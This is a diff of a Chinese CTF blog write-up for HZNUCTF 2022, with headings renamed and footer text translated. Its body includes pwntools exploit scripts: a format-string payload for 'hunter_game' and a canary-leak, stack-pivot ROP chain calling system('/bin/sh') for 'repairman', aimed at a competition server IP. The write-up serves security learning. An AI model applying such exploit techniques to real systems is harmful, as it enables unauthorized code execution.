class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solution = Solve()</span><br><span class="line">    solution.solve()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h3 id="pwn-hunter-game（not-solve）"><a href="#pwn-hunter-game（not-solve）" class="headerlink" title="pwn-hunter_game（not solve）"></a>pwn-hunter_game（not solve）</h3><p>知识点</p>
+<h2 id="Pwn-1"><a href="#Pwn-1" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="hunter-game"><a href="#hunter-game" class="headerlink" title="hunter_game"></a>hunter_game</h3><p>知识点</p>
 <ul>
 <li>scanf的格式化字符串漏洞</li>
 </ul>
@@ -551,7 +541,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./hunter_game&quot;</span>)</span><br><span class="line"><span class="comment"># io = remote(&quot;121.40.181.50&quot;, 10000)</span></span><br><span class="line"></span><br><span class="line">bullet = <span class="number">0x400811</span></span><br><span class="line">payload = <span class="string">b&#x27;%7$s&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(p64(bullet) * <span class="number">1000</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220416161757958.png" alt="image-20220416161757958"></p>
-<h3 id="pwn-repairman"><a href="#pwn-repairman" class="headerlink" title="pwn-repairman"></a>pwn-repairman</h3><p>补充上次<a href="https://4xwi11.github.io/posts/7744a72a/">2021湖湘杯线下赛的game复现</a>，这次着重注意下抬栈的操作</p>
+<h3 id="repairman"><a href="#repairman" class="headerlink" title="repairman"></a>repairman</h3><p>补充上次<a href="https://4xwi11.github.io/posts/7744a72a/">2021湖湘杯线下赛的game复现</a>，这次着重注意下抬栈的操作</p>
 <p>64位栈迁移，开了canary</p>
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220416200814911.png" alt="image-20220416200814911"></p>
 <p>如下图所示，有system函数，<code>/bin/sh</code>可以在main里输入bss段</p>
@@ -582,7 +572,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;121.40.181.50&quot;</span>, <span class="number">10001</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./repairman&quot;)</span></span><br><span class="line">system_addr = <span class="number">0x4006d0</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400be3</span></span><br><span class="line">bss_addr = <span class="number">0x6020c0</span></span><br><span class="line">ret_addr = <span class="number">0x400679</span></span><br><span class="line">leave_ret_addr = <span class="number">0x4009b8</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;/bin/sh\x00&quot;</span> + p64(ret_addr) * <span class="number">0x197</span> + p64(pop_rdi_ret) + p64(bss_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&quot;A&quot;</span> * <span class="number">40</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;A&quot;</span> * <span class="number">40</span> + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary ====&gt;&quot;</span>, <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b&quot;A&quot;</span> * <span class="number">40</span> + p64(canary) + p64(bss_addr) + p64(leave_ret_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220416212811339.png" alt="image-20220416212811339"></p>
-<h3 id="re-fuckoff-easy-code"><a href="#re-fuckoff-easy-code" class="headerlink" title="re-fuckoff_easy_code"></a>re-fuckoff_easy_code</h3><p>知识点</p>
+<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="fuckoff-easy-code"><a href="#fuckoff-easy-code" class="headerlink" title="fuckoff_easy_code"></a>fuckoff_easy_code</h3><p>知识点</p>
 <ul>
 <li>花指令</li>
 </ul>
@@ -608,11 +598,10 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">0x0000000C</span>, <span class="number">0x0000001E</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000011</span>, <span class="number">0x00000007</span>, <span class="number">0x00000010</span>, <span class="number">0x00000002</span>, <span class="number">0x0000001F</span>, <span class="number">0x00000022</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000033</span>, <span class="number">0x00000021</span>, <span class="number">0x00000016</span>, <span class="number">0x0000003B</span>, <span class="number">0x00000007</span>, <span class="number">0x0000002B</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x0000003B</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000037</span>, <span class="number">0x0000001D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000019</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(c[i] ^ <span class="number">100</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220417121514126.png" alt="image-20220417121514126"></p>
-<h3 id="re-virus"><a href="#re-virus" class="headerlink" title="re-virus"></a>re-virus</h3><p>知识点</p>
+<h3 id="virus"><a href="#virus" class="headerlink" title="virus"></a>virus</h3><p>知识点</p>
 <ul>
 <li>病毒脱壳</li>
 </ul>
-<p>病毒是吧，fuck@Scr1pt</p>
 <p>正常做法太长，这里记下非预期的做法</p>
 <p>运行程序</p>
 <p>打开Scylla，将进程dump下来</p>
@@ -635,36 +624,30 @@
 <div class="post-copyright">
 <ul>
   <li class="post-copyright-author">
-      <strong>本文作者： </strong>4XWi11
+      <strong>Post author:  </strong>4XWi11
   </li>
   <li class="post-copyright-link">
-      <strong>本文链接：</strong>
+      <strong>Post link: </strong>
       <a href="https://4xwi11.github.io/posts/8de4998e/" title="20220409-HZNUCTF">https://4xwi11.github.io/posts/8de4998e/</a>
   </li>
   <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
   </li>
 </ul>
 </div>
 
-          <div class="post-tags">
-              <a href="/tags/DFA/" rel="tag"># DFA</a>
-              <a href="/tags/hijack-stack-chk-fail/" rel="tag"># hijack __stack__chk_fail</a>
-              <a href="/tags/%E8%8A%B1%E6%8C%87%E4%BB%A4/" rel="tag"># 花指令</a>
-              <a href="/tags/%E6%8A%AC%E6%A0%88/" rel="tag"># 抬栈</a>
-          </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/posts/d42f9c86/" rel="prev" title="20220108-CAZY">
-                  <i class="fa fa-chevron-left"></i> 20220108-CAZY
+                <a href="/posts/d42f9c86/" rel="prev" title="20220108-长安战“疫”">
+                  <i class="fa fa-chevron-left"></i> 20220108-长安战“疫”
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/posts/a6b76827/" rel="next" title="USBKey-Learning">
-                  USBKey-Learning <i class="fa fa-chevron-right"></i>
+                <a href="/posts/a6b76827/" rel="next" title="USBKey Learning">
+                  USBKey Learning <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
@@ -704,8 +687,8 @@
           mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
           seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
           snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
-          document.getElementById("timeDate").innerHTML = "博主已经爬了 "+dnum+" 天 "; 
-          document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+          document.getElementById("timeDate").innerHTML = " has been running for "+dnum+" Days "; 
+          document.getElementById("times").innerHTML = hnum + " H " + mnum + " Min " + snum + " S "; 
       } 
   setInterval("createtime()",250);
   </script>
@@ -715,13 +698,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">1m</span>
+    <span title="Symbols count total">873k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">15:51</span>
+    <span title="Reading time total">13:13</span>
   </span>
 </div>
 <div class="busuanzi-count">
@@ -729,7 +712,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-user"></i>
       </span>
-      <span class="site-uv" title="总访客量">
+      <span class="site-uv" title="Total Visitors">
         <span id="busuanzi_value_site_uv"></span>
       </span>
     </span>
@@ -737,20 +720,26 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-eye"></i>
       </span>
-      <span class="site-pv" title="总访问量">
+      <span class="site-pv" title="Total Views">
         <span id="busuanzi_value_site_pv"></span>
       </span>
     </span>
 </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
 
     </div>
   </footer>
 
   
   <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
   <script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js" integrity="sha256-EdPgYcPk/IIrw7FYeuJQexva49pVRZNmt3LculEr7zM=" crossorigin="anonymous"></script>
   <script src="https://cdn.jsdelivr.net/npm/lozad@1.16.0/dist/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
 <script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+// 在最后添加<script src="/js/code-unfold.js"></script>
 
   
 <script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
@@ -758,6 +747,7 @@
 
 
 
+  <script src="/js/third-party/fancybox.js"></script>
 
 
   
